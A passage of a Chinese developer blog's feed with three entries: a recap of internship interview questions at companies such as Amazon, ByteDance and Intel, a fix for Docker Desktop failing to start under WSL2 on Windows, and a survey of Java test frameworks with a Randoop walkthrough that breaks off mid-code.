    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自 3.31 投递简历以来，有至今没有消息的，有已经挂了，也有拿到 offer 的。真的要早点准备早点投递，有内推就内推，就我头铁直接到处投…… 另外，说话圆滑肯定更讨喜，我的一些反问可能太直接了:(</p><p>经过一个多月的战斗（笔试面试），最终我决定去亚马逊实习，很幸运能够从测试转到开发，非常感谢大家的工作与支持。</p><p>接下来按<strong>一面</strong>时间顺序罗列面试记录。</p><h1 id="面试记录"><a href="#面试记录" class="headerlink" title="面试记录"></a>面试记录</h1><h2 id="京东科技"><a href="#京东科技" class="headerlink" title="京东科技"></a>京东科技</h2><p>投递时貌似还没有暑期实习的岗位，应该是日常实习的岗位。体验不好的一点是面试之后查询不到投递信息，邮件询问的反馈是岗位可能不匹配（那也不用清除记录吧……）。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>介绍在项目里都做哪些具体的内容<ul><li>用 Go 做区块链项目，用了哪些包，如何扩展其他的包</li><li>用 Python 写的链路追踪工具，是否有看过完整的项目，介绍一下</li><li>用 Java 写的静态分析工具，介绍一下（面试官熟悉 Python）</li></ul></li><li>OpenStack 组件都有哪些，都是干嘛的，以及组件内部是如何实现的</li><li>用过 Kolla-Ansible，那它是如何实现的</li><li>Docker 常用命令，例如，如何打包镜像</li><li>Linux 常用指令<ul><li>如何查看占用 80 端口的进程</li><li>如何杀死 nginx 进程</li><li>查找包含特定字符串的文件</li><li>字符串替换</li><li>如何使用一行命令实现上述功能</li></ul></li><li>Python 相关的内容<ul><li>基本数据类型、排序操作等</li><li>如何打包和发布</li><li>有用 Python 做什么东西</li><li>装饰器如何实现</li></ul></li><li>了解 Nginx 引擎吗，反向代理如何实现</li><li>介绍一下了解的 Git 指令</li><li>开源社区贡献</li><li>如何搭建博客（实际上是想问怎么部署到服务器上）</li></ol><h2 id="图森未来"><a href="#图森未来" class="headerlink" title="图森未来"></a>图森未来</h2><p>印象深刻，使用内推码投递，一面就是考察做题，当时还没怎么做 leetcode 上的题，结果非常艰难地做完第一题，第二题毫无头绪，后续当然是没有后续了。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>项目相关内容<ul><li>是否参考开源代码</li><li>遇到的难点，如何解决</li></ul></li><li>算法<ul><li>贪心 + 小根堆</li><li>动态规划</li></ul></li></ol><h2 id="亚马逊"><a href="#亚马逊" class="headerlink" title="亚马逊"></a>亚马逊</h2><p>投递了测试（SDET）和开发（SDE）的岗位，收到了测试的笔试，很简单的两道题，次周就约面试了。两轮面试后，通知我需要等待团队匹配，后来得知是原来的团队不缺测试了，但有团队需要开发，兴冲冲地接受了，但需要加面一轮。不过最后还是如愿以偿拿到 offer 了~</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>项目相关<ul><li>详细介绍一个项目</li><li>开发的主要难点</li><li>应用情况</li><li>追踪云平台与追踪云平台上的软件的差别（开发难点）</li></ul></li><li>遇到的困难与解决</li><li>算法<ul><li>删除字符串中的所有回文子串</li></ul></li></ol><p><strong>二面（算法）</strong></p><ol><li>删除倒数第 N 个节点<ul><li>给出一些 testcase</li></ul></li><li>设计 Employee 类<ul><li>id、name、title、reporter</li><li>返回手下员工数量</li><li>找到报告链</li></ul></li></ol><p><strong>三面</strong></p><ol><li>自我介绍</li><li>项目<ul><li>区块链项目介绍</li><li>Java 程序分析项目介绍</li></ul></li><li>算法<ul><li>K个一组翻转链表</li><li>二叉树右视图（BFS、DFS）</li></ul></li><li>项目中遇到的困难与解决</li></ol><h2 id="英特尔"><a href="#英特尔" class="headerlink" title="英特尔"></a>英特尔</h2><p>接到电话后直接开始电话面，后来线下面发现是二面的面试官打的电话。线下面来到环球贸易中心的办公室，面试地点应该是一个小讨论间，一路走来感觉略沉闷……？可能这就是老牌公司的沉稳。两轮技术面，因为 boss 没空所以没有第三轮，不过后来我也没接到通知。</p><p><strong>电话面</strong></p><ol><li>项目<ul><li>对云计算的理解</li><li>为什么用 Jaeger</li></ul></li><li>算法<ul><li>最小深度</li><li>最左侧的最小深度</li></ul></li><li>八股<ul><li>进程与线程</li><li>程序内存如何分配（进程堆栈都分配什么）</li><li>TCP&#x2F;IP 三次握手</li><li>Golang 中的协程</li><li>Linux 中常用的指令</li><li>Linux 系统中查看磁盘占用情况</li></ul></li></ol><p><strong>一面</strong></p><ol><li>算法（30min）：2基础 + 2提升<ul><li>找出第 k 大的数字</li><li>删除字符串中相邻的相同字符，重复操作，返回结果字符串</li><li>二叉树，到叶节点路径和为 k 的路径</li><li>不含重复元素的数组，找出和为 k 的元素对（集合）</li></ul></li><li>项目相关<ul><li>创建 VM 的组件交互</li><li>还记得哪些交互</li><li>如何收集信息</li><li>信息如何传递（调用什么接口、怎么调用）</li><li>负责开发哪部分，举例说明</li></ul></li><li>Linux 常用操作有哪些</li><li>操作系统管理的资源</li><li>硬件相关：主板、插槽、USB、总线</li><li>如何实现资源共享（互斥、锁的种类）</li><li>进程间通信都有哪些方式</li><li>学过哪些课程<ul><li>对称加密、非对称加密</li><li>为什么一把加密一把解密（原理）</li><li>PKI</li></ul></li><li>读过 Unix 编程吗（好书）</li></ol><p><strong>二面</strong></p><ol><li>上一位是否考察英文</li><li>英文如何</li><li>英文谈谈对 Infrastructure 的理解<ul><li>重点是资源虚拟化、分布式其次</li></ul></li><li>上一位考察了哪些内容</li><li>用过哪些 Docker 指令，主要用 docker 做什么</li><li>介绍一下目前在做的 Java 项目</li><li>一些 Java 相关问题（完全不会）</li><li>学过哪些课程，喜欢什么</li><li>有考虑内核方向吗，刚喜欢偏下层还是偏上层的（结果认为我喜欢应用开发……）</li><li>为什么觉得北邮的课程水</li><li>保研还是考研</li><li>谈谈自己的优势</li><li>工作规划</li><li>了解 k8s 的什么</li><li>为什么来英特尔</li><li>反问</li><li>为什么想要 transfer</li><li>刷题是为了干嘛</li></ol><p>6.2 收到 Intern 的笔试通知（看了下记录是 4.16 投递的，要求使用腾讯会议笔试，并将答案拍照发邮件），然后 6.11 才想起来这是 6.8 的笔试，whatever</p><h2 id="美团"><a href="#美团" class="headerlink" title="美团"></a>美团</h2><p>当时对 Java 还不是很熟悉，硬生生面了一个小时。先是美团配送两轮面试，然后立马被另一个微信小程序的团队捞起一面，也没有后续了。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>Java 技术栈（不匹配，问点别的）</li><li>数据库<ul><li>ACID 属性</li><li>举个例子，都对应哪些属性</li></ul></li><li>计算机网络<ul><li>TCP 和 UDP 的区别</li><li>TCP 相关机制：确认、重传、拥塞控制</li></ul></li><li>操作系统<ul><li>进程和线程的区别</li></ul></li><li>情境描述<ul><li>如何设计好一个接口</li><li>请求调用非常慢，如何排查&#x2F;优化</li><li>项目中遇到的难题与解决，再次遇到是否会加快处理速度</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>项目<ul><li>区块链<ul><li>用来做什么</li><li>用什么机制，工作量证明？</li><li>主要负责什么内容</li><li>如何拿到 OTP（节点入网）</li><li>单向 TLS 是什么</li><li>CA 的作用</li></ul></li><li>链路追踪<ul><li>介绍</li><li>追踪数据如何传递<ul><li>进程-线程-元数据</li></ul></li><li>ES 使用哪种分页</li><li>多机部署如果有台主机挂了怎么办，追踪链路断开？</li><li>如何保证性能</li></ul></li></ul></li><li>对什么语言比较熟<ul><li>Python 底层的垃圾回收机制</li></ul></li><li>用过哪些数据库，了解到什么地步</li><li>MySQL 数据库隔离级别，分别解决哪些问题</li><li>对称加密和非对称加密的区别</li><li>TLS 如何建立连接（单向、双向），对称密钥？非对称密钥？</li><li>如何验证证书链</li><li>算法<ul><li>二叉树上视图</li></ul></li></ol><p><strong>一面</strong></p><ol><li>自我介绍</li><li>项目相关<ul><li>CA 架构</li><li>链路追踪如何实现，负责哪些部分</li><li>Java 程序分析系统如何实现</li><li>遇到的问题与解决</li><li>ES 相关问题</li></ul></li><li>数据库<ul><li>隔离级别</li><li>并发错误</li><li>MVCC</li><li>如何预防幻读</li><li>索引类型</li><li>索引底层实现</li><li>索引优缺点</li><li>锁</li></ul></li><li>计算机网络<ul><li>协议对应哪层（HTTP、TCP）</li><li>TCP 与 UDP</li><li>TCP 如何确保可靠</li><li>TCP 其他机制（流量控制、拥塞控制）</li><li>HTTP 与 HTTPS</li></ul></li><li>Java 数据类型</li><li>字典和集合的区别与实现</li><li>10 亿数据搜索 top10 如何实现<ul><li>回答堆，堆的底层实现</li></ul></li><li>看源码时注意什么，是否学习写法</li><li>算法<ul><li>无重复字符的最长子串</li></ul></li></ol><h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p>面我的团队只要会 C++ 的，所以没有三连面，直接一面挂。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>项目中遇到的难点</li><li>进程线程区别</li><li>锁（互斥、共享）</li><li>TCP 在哪一层</li><li>Linux 查看文本的操作</li><li>shell 如何运行指令</li><li>做过多线程编程吗</li><li>算法<ul><li>合并两个有序数组</li><li>实现拷贝函数 <code>char* memcopy(char* source, char* dest, int n)</code> 考虑地址重叠的情况</li></ul></li></ol><h2 id="特斯拉"><a href="#特斯拉" class="headerlink" title="特斯拉"></a>特斯拉</h2><p>面试很水，三面体验极差，9 分钟的面试真是让我开了眼了。问想留在特斯拉还是积累经验，就不该<strong>诚实</strong>回答积累经验，英文问题很突然，既然是重点考察内容就该放在一面……</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>链路追踪<ul><li>对云平台还是对云平台之上的软件追踪</li><li>各个组件的作用</li><li>创建虚拟机的组件交互</li><li>追踪的数据是什么</li><li>能用来做什么，是否做过实际的性能调优，瓶颈检查</li><li>虚拟机网络和主机网络的区别</li><li>遇到的困难与解决</li><li>讲一下 Kolla-Ansible</li></ul></li><li>Java 程序分析系统<ul><li>简单介绍</li></ul></li><li>区块链<ul><li>负责哪些内容</li><li>容器化</li></ul></li><li>对 Devops 的理解</li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>项目相关内容</li><li>公有云私有云的运维愿意做哪个（AWS、AZure）</li><li>为什么选择特斯拉这个车企</li><li>接触的编程语言中觉得哪个最好</li></ol><p><strong>三面</strong></p><ol><li>做过哪些和岗位相关的工作内容</li><li>对 CI&#x2F;CD 的理解</li><li>接触过 jerkins、prometheus、grafana 之类的吗</li><li>项目中遇到的困难与解决</li><li>有意愿留在特斯拉吗，还是来积累经验</li><li>英文<ul><li>Why Telsa</li><li>Benefit of microservice</li></ul></li></ol><h2 id="联想"><a href="#联想" class="headerlink" title="联想"></a>联想</h2><p>安全实验室，一面有三五个面试官，一面过了就拿到 offer 了。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>Java 程序分析系统<ul><li>具体是怎么做的</li><li>能够检测什么</li><li>如何抽象</li><li>静态分析是做什么，污点追踪</li><li>介绍一下 Soot 框架</li></ul></li><li>区块链中负责哪些内容</li><li>接触过一些逆向的东西吗（WinDbg、IDA）</li></ol><h2 id="FreeWheel"><a href="#FreeWheel" class="headerlink" title="FreeWheel"></a>FreeWheel</h2><p>在看起来很像盗版网站的官网投递，没法查询投递记录，笔试时选择部门意向。二面的面试官不会算法的样子，问思路就是不知道，反问我要不换道题……</p><p><strong>一面</strong></p><ol><li>进程与线程</li><li>为什么要线程（分页）</li><li>什么叫无状态</li><li>HTTP 1.0、2.0 区别</li><li>HTTP Method</li><li>HTTP 如何保持连接</li><li>POST 和 GET 区别</li><li>Session 和 Cookie</li><li>ACID、隔离级别、并发一致性问题</li><li>MySQL 引擎与区别</li><li>算法<ul><li>判断图是否连通</li></ul></li></ol><p><strong>二面</strong></p><ol><li>项目中遇到的问题与解决</li><li>HTTP 是无状态的吗，如何变成有状态</li><li>用过哪些 python 框架、java 框架</li><li>用过哪些数据库</li><li>MySQL 索引都有哪些</li><li>算法<ul><li>子序列</li><li>编辑距离</li></ul></li></ol><h2 id="字节跳动"><a href="#字节跳动" class="headerlink" title="字节跳动"></a>字节跳动</h2><p>一面考察比较全面，项目八股算法；二面体验极差，算法不会就换题，提问没有反馈没有 hint，非要写<strong>链表快排</strong>，体验就像是面对一个随机出题的题库，剩余时间让我介绍一下项目。看来字节面试真的看运气，遇到这种……我当时就该问面试官会不会写。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>Java 程序分析系统是怎样的，做到哪里了</li><li>go、python、java 之间的区别&#x2F;特性</li><li>用过哪些数据库，区别和各自的使用场景</li><li>数据库隔离级别都解决哪些并发错误、多版本并发控制</li><li>HTTP Method<ul><li>作用</li><li>安全性</li><li>幂等</li><li>比较 GET 和 POST</li></ul></li><li>HTTP 与 HTTPS<ul><li>如何建立 TLS</li><li>安全隐患：中间人攻击，展开，如何伪装中间人</li></ul></li><li>数据库隔离级别、并发错误、多版本并发控制</li><li>索引<ul><li>对什么列建立索引</li><li>索引类型</li><li>索引的优缺点</li></ul></li><li>算法<ul><li>棋盘问题，下棋（全放满），谁的连通块面积最大就赢了</li><li>扩展，如果算正方形面积呢</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>三次握手</li><li>四次挥手</li><li>状态</li><li>线程独占资源</li><li>线程挂掉影响进程吗</li><li>MySQL 索引实现方式</li><li>为什么用 B+ 树</li><li>HTTP 1.0、2.0、3.0</li><li>算法<ul><li>读写者</li><li>图判环</li><li>链表快排</li></ul></li><li>链路追踪如何实现</li></ol><h2 id="腾讯"><a href="#腾讯" class="headerlink" title="腾讯"></a>腾讯</h2><p>投递的时候已经错过了笔试时间，所以接到面试通知还是很惊讶的，好像是腾讯云的北京团队，做混沌工程的，面试官应该是做 research 的，还问我发表论文与否。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>项目相关<ul><li>Java 分析系统与现有分析工具的区别；复现的论文是什么会议，效果如何；白盒自动化</li><li>链路追踪系统整体介绍，难题与解决；了解其他链路追踪工具吗；如何测试，性能影响；给漏洞挖掘辅助</li><li>项目是否有发论文</li><li>编程语言（go、python、java 都接触过）</li><li>Docker 如何选择基础镜像，减小容器体积</li><li>有写过单元测试吗，考虑代码质量吗</li></ul></li><li>算法<ul><li>滑动窗口最大值</li></ul></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实际上我投递了有 30+ 公司，基本都没有内推，有些直接挂掉了简历，有些至今没有消息，相对来说我投递得还是比较晚的。为了能够拿到 offer 而反复阅读和刷题真的挺消磨心智的……，想学的东西不得不延后，最好的情况是工作和自己的兴趣恰好有交叉（个人看法），23 届加油！</p>]]></content>
    
    
    <summary type="html">京东科技、图森未来、美团、百度、联想、字节跳动、腾讯、特斯拉、英特尔、FreeWheel、亚马逊</summary>
    
    
    
    <category term="Notes" scheme="https://jckling.github.io/categories/Notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker Desktop stopped 问题解决</title>
    <link href="https://jckling.github.io/2022/05/05/Other/Docker%20Desktop%20stopped%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    <id>https://jckling.github.io/2022/05/05/Other/Docker%20Desktop%20stopped%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</id>
    <published>2022-05-05T02:46:40.000Z</published>
    <updated>2022-11-13T05:47:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>最近开始使用 WSL2 + Docker Desktop (4.7.1)，有段时间用雷电模拟器玩手游（和 Docker 冲突），现在又要用 Docker，干脆把模拟器卸载了，但 Docker 仍然不可用。</p><p>每次打开都是 <code>Docker Desktop stopped</code>，并弹窗报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error during connect: In the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect.: Get &quot;http://%2F%2F.%2Fpipe%2Fdocker_engine/v1.24/containers/json&quot;: open //./pipe/docker_engine: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>经过以下步骤解决，不过也可能只需要执行部分操作。</p><ol><li><p>重置网络编程接口</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure></li><li><p>使用 cmd 切换 Linux 或 Windows 容器</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Docker\Docker\DockerCli.exe&quot; -SwitchDaemon</span><br></pre></td></tr></table></figure></li><li><p>关闭再打开 “适用于 Linux 的 Windows 子系统”</p><p> 需要重启</p></li><li><p>重装 Ubuntu</p><p> 在应用商店里操作即可</p></li><li><p>重装 Docker Desktop</p><p> 经过上面的一系列折腾发现不弹窗报错，但仍然是停止的状态。重装 Docker Desktop 之后可以用了……</p></li></ol><h2 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h2><ul><li><a href="https://github.com/docker/for-win/issues/1825">error during connect: Get http:&#x2F;&#x2F;%2F%2F.%2Fpipe%2Fdocker_engine&#x2F;v1.35&#x2F;info: open &#x2F;&#x2F;.&#x2F;pipe&#x2F;docker_engine: The system cannot find the file specified. In the default daemon configuration on Windows, the docker client must be run elevated to connect. This error may also indicate that the docker daemon is not running. #1825</a></li><li><a href="https://stackoverflow.com/questions/67406780/not-able-to-start-docker-desktop-in-windows">Not able to start docker Desktop in Windows</a></li><li><a href="https://forums.docker.com/t/solved-docker-failed-to-start-docker-desktop-for-windows/106976">[SOLVED] Docker Failed to Start - Docker Desktop for Windows</a></li><li><a href="https://github.com/docker/for-win/issues/10958">Docker Desktop fails to start&#x2F;run on Windows startup #10958</a></li></ul>]]></content>
    
    
    <summary type="html">Docker Desktop 4.7.1</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Windows" scheme="https://jckling.github.io/tags/Windows/"/>
    
    <category term="Docker" scheme="https://jckling.github.io/tags/Docker/"/>
    
    <category term="问题解决" scheme="https://jckling.github.io/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>Java 自动单元测试生成框架</title>
    <link href="https://jckling.github.io/2022/04/27/Other/Java%20%E8%87%AA%E5%8A%A8%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6/"/>
    <id>https://jckling.github.io/2022/04/27/Other/Java%20%E8%87%AA%E5%8A%A8%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6/</id>
    <published>2022-04-27T02:09:06.000Z</published>
    <updated>2023-03-06T15:01:58.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试框架"><a href="#测试框架" class="headerlink" title="测试框架"></a>测试框架</h1><ul><li>BDD(Behaviour-Driven Development)：行为驱动开发</li><li>TDD(Test-Driven Development)：测试驱动开发</li></ul><table><thead><tr><th>框架</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td><a href="https://github.com/junit-team/junit5/">JUnit</a></td><td>TDD</td><td>最基本的测试框架，可以与 Selenium 一同使用</td></tr><tr><td>JBehave</td><td>BDD</td><td>主要与 Selenium WebDriver 一起使用</td></tr><tr><td>Serenity</td><td>BDD</td><td>可以与 JBehave、JUnit 集成</td></tr><tr><td>TestNG</td><td>TDD</td><td>主要使用 XML 配置，集成端到端测试</td></tr><tr><td>Mockito</td><td>TDD</td><td>通过反射模拟对象，可以与 TestNG、JUnit 集成</td></tr><tr><td>HttpUnit</td><td>BDD</td><td>基于 JUnit 开发，网站测试</td></tr><tr><td>JWebUnit</td><td>BDD</td><td>网站测试</td></tr><tr><td><a href="https://github.com/getgauge/gauge">Gauge</a></td><td>BDD</td><td>网站测试</td></tr><tr><td>Geb</td><td>BDD</td><td>网站测试</td></tr><tr><td><a href="https://github.com/selenide/selenide">Selenide</a></td><td>BDD</td><td>由 Selenium 提供支持，网站测试</td></tr><tr><td><a href="https://github.com/spockframework/spock">Spock</a></td><td>BDD</td><td>网站测试</td></tr><tr><td><a href="https://github.com/cucumber/cucumber-jvm">Cucumber</a></td><td>BDD</td><td>支持 Java、JS、Ruby 等多种言</td></tr><tr><td><a href="https://github.com/EvoSuite/evosuite/tree/v1.2.0">EvoSuite</a></td><td></td><td>自动生成 JUnit 单元测试</td></tr><tr><td><a href="https://github.com/randoop/randoop">Randoop</a></td><td></td><td>自动生成 JUnit 单元测试</td></tr><tr><td><a href="https://github.com/ksen007/janala2">CATG</a></td><td></td><td>concolic 测试引擎，使用 ASM 进行插桩，依赖 python2.7，18 年停止更新</td></tr><tr><td><a href="https://github.com/konveyor/tackle-test-generator-cli">Tackle-test</a></td><td></td><td>集成 EvoSuite 和 Randoop</td></tr><tr><td><a href="https://github.com/vorpal-research/kex/tree/sbst-contest">Kex</a></td><td></td><td>用于 Java 字节码的白盒模糊测试工具</td></tr><tr><td><a href="https://github.com/ilebrero/evosuite/releases/tag/DSE.SBSTToolCompetition2021">EvoSuite DSE</a></td><td></td><td>支持 concolic 测试</td></tr></tbody></table><p>除了开源框架之外，也有些软件支持自动化单元测试（Automated Unit Testing），包括 Devmate、Diffblue、Ponicode、Symflower 等等。</p><h1 id="Randoop"><a href="#Randoop" class="headerlink" title="Randoop"></a>Randoop</h1><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>大部分脚本使用 Perl 编写，无法在 Windows 环境中编译</p><ul><li><a href="https://github.com/randoop/randoop/issues/165">Generating user manual fails on Windows #165</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/randoop/randoop.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 Randoop、编译 Java 代理、运行所有测试、构建 jar 文件并从源 Javadoc 更新手册</span></span><br><span class="line">./gradlew build manual</span><br></pre></td></tr></table></figure><p>Windows 中可以使用编译好的文件：<a href="https://github.com/randoop/randoop/releases/download/v4.3.0/randoop-4.3.0.zip">randoop-4.3.0.zip</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置环境变量（powershell）</span></span><br><span class="line"><span class="variable">$Env:RANDOOP_JAR</span> = <span class="string">&quot;D:\Study\Github\Java-Deserialization\实验\UnitTest\randoop-all-4.3.0.jar&quot;</span></span><br><span class="line"><span class="variable">$Env:RANDOOP_JAR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 帮助信息</span></span><br><span class="line">java <span class="literal">-classpath</span> <span class="variable">$Env:RANDOOP_JAR</span> randoop.main.Main help gentests</span><br><span class="line"></span><br><span class="line">java <span class="literal">-classpath</span> randoop<span class="literal">-all-4</span>.<span class="number">3.0</span>.jar randoop.main.Main help gentests</span><br></pre></td></tr></table></figure><p>默认情况下，Randoop 生成并输出两种单元测试，写入单独的文件。</p><ul><li>错误显示测试（<code>error-revealing-tests</code>）是在执行时失败的测试，表明一个或多个被测类中存在潜在错误。<ul><li>当 Randoop 调用创建对象的方法时，Randoop 会验证该对象的格式是否正确。</li><li>检查：<code>Object.equals()</code>、<code>Object.hashCode()</code>、<code>Object.clone()</code>、<code>Object.toString()</code>、<code>Comparable.compareTo()</code>、<code>Comparator.compare()</code>、使用 <code>@CheckRep</code> 注释的空方法</li></ul></li><li>回归测试（<code>regression-tests</code>）是在执行时通过的测试，可用于扩充回归测试套件。<ul><li>在程序更改&#x2F;重构之前实施的测试在代码更新后应该仍然成功，否则就可能在代码中引入了新错误。</li></ul></li></ul><p>Randoop 支持对 jar 文件、指定类、指定方法生成 JUnit 测试。</p><h3 id="指定多个类"><a href="#指定多个类" class="headerlink" title="指定多个类"></a>指定多个类</h3><p>创建 myclasses.txt 文件，指定被测类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.util.Collections</span><br><span class="line">java.util.TreeSet</span><br></pre></td></tr></table></figure><p>调用 randoop 并将执行时间限制为 60 秒</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-classpath</span> <span class="variable">$Env:RANDOOP_JAR</span> randoop.main.Main gentests <span class="literal">--classlist</span>=myclasses.txt <span class="literal">--time-limit</span>=<span class="number">60</span></span><br></pre></td></tr></table></figure><p>输出结果，只生成了 RegressionTest，没有 ErrorTest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Randoop for Java version 4.3.0.</span><br><span class="line"></span><br><span class="line">Will try to generate tests for 2 classes.</span><br><span class="line">PUBLIC MEMBERS=112</span><br><span class="line">Explorer = ForwardGenerator(steps: 0, null steps: 0, num_sequences_generated: 0;</span><br><span class="line">    allSequences: 0, regresson seqs: 0, error seqs: 0=0=0, invalid seqs: 0, subsumed_sequences: 0, num_failed_output_test: 0;</span><br><span class="line">    runtimePrimitivesSeen:38)</span><br><span class="line"></span><br><span class="line">Progress update: steps=1, test inputs generated=0, failing inputs=0      (2022-02-28T02:36:46.426Z     43.5M used)</span><br><span class="line">Progress update: steps=1000, test inputs generated=823, failing inputs=0      (2022-02-28T02:37:03.368Z     419M used)</span><br><span class="line">Progress update: steps=2000, test inputs generated=1630, failing inputs=0      (2022-02-28T02:37:19.685Z     528M used)</span><br><span class="line">Progress update: steps=3000, test inputs generated=2440, failing inputs=0      (2022-02-28T02:37:35.947Z     339M used)</span><br><span class="line">Progress update: steps=3690, test inputs generated=2960, failing inputs=0      (2022-02-28T02:37:46.426Z     225M used)</span><br><span class="line">Normal method executions: 4962090</span><br><span class="line"></span><br><span class="line">Exceptional method executions: 534</span><br><span class="line"></span><br><span class="line">Average method execution time (normal termination):      0.000157                                              </span><br><span class="line">Average method execution time (exceptional termination): 0.0369                                      </span><br><span class="line">Approximate memory usage 225M</span><br><span class="line"></span><br><span class="line">Explorer = ForwardGenerator(steps: 3690, null steps: 730, num_sequences_generated: 2960;</span><br><span class="line">    allSequences: 2960, regresson seqs: 1254, error seqs: 0=0=0, invalid seqs: 0, subsumed_sequences: 0, num_failed_output_test: 1706;</span><br><span class="line">    runtimePrimitivesSeen:47)</span><br><span class="line"></span><br><span class="line">No error-revealing tests to output.</span><br><span class="line"></span><br><span class="line">About to look for failing assertions in 831 regression sequences.</span><br><span class="line"></span><br><span class="line">Regression test output:</span><br><span class="line">Regression test count: 831</span><br><span class="line">Writing regression JUnit tests...</span><br><span class="line">Created file D:\Study\Github\randoop\RegressionTest0.java </span><br><span class="line">Created file D:\Study\Github\randoop\RegressionTest1.java</span><br><span class="line">Created file D:\Study\Github\randoop\RegressionTest.java</span><br><span class="line">Wrote regression JUnit tests.</span><br><span class="line">About to look for flaky methods.</span><br><span class="line"></span><br><span class="line">Invalid tests generated: 0</span><br><span class="line"></span><br><span class="line">Uncompilable sequences generated (count: 1705).</span><br><span class="line">Please report uncompilable sequences at https://github.com/randoop/randoop/issues ,</span><br><span class="line">providing the information requested at https://randoop.github.io/randoop/manual/index.html#bug-reporting .</span><br></pre></td></tr></table></figure><h3 id="指定类文件"><a href="#指定类文件" class="headerlink" title="指定类文件"></a>指定类文件</h3><p>创建文件 Message.java 并编译为 .class 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Message</span><span class="params">(String message)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.message = message;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">printMessage</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(message);</span><br><span class="line"><span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span 